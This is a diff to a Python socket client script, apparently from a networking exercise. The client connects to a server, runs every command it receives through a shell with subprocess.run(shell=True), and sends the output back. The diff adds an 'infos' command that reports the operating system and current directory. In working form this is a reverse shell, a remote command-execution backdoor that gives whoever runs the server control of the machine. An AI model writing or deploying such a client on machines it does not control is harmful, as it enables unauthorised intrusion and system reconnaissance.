@@ -1,4 +1,6 @@
 # ---------- Sockets network : Client ----------
+import os
+import platform
 import socket
 import time
 import subprocess
@@ -29,11 +31,15 @@ while True:
         break
     command = command_data.decode()
     print(f"Command : ", command)
-    result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
-    response = result.stdout + result.stderr
 
-    if not response or len(response) == 0:
-        response = ""
+    if command == "infos":
+        response = platform.platform() + " " + os.getcwd()
+    else:
+        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
+        response = result.stdout + result.stderr
+
+        if not response or len(response) == 0:
+            response = ""
 
     # HEADER 13 octets -> length octet
     # DATA (length) octets
@@ -45,5 +51,7 @@ while True:
     print(f"Header {header}")
     s.sendall(header.encode())
     s.sendall(response.encode())
+
+    # Hanshake
 
 s.close()
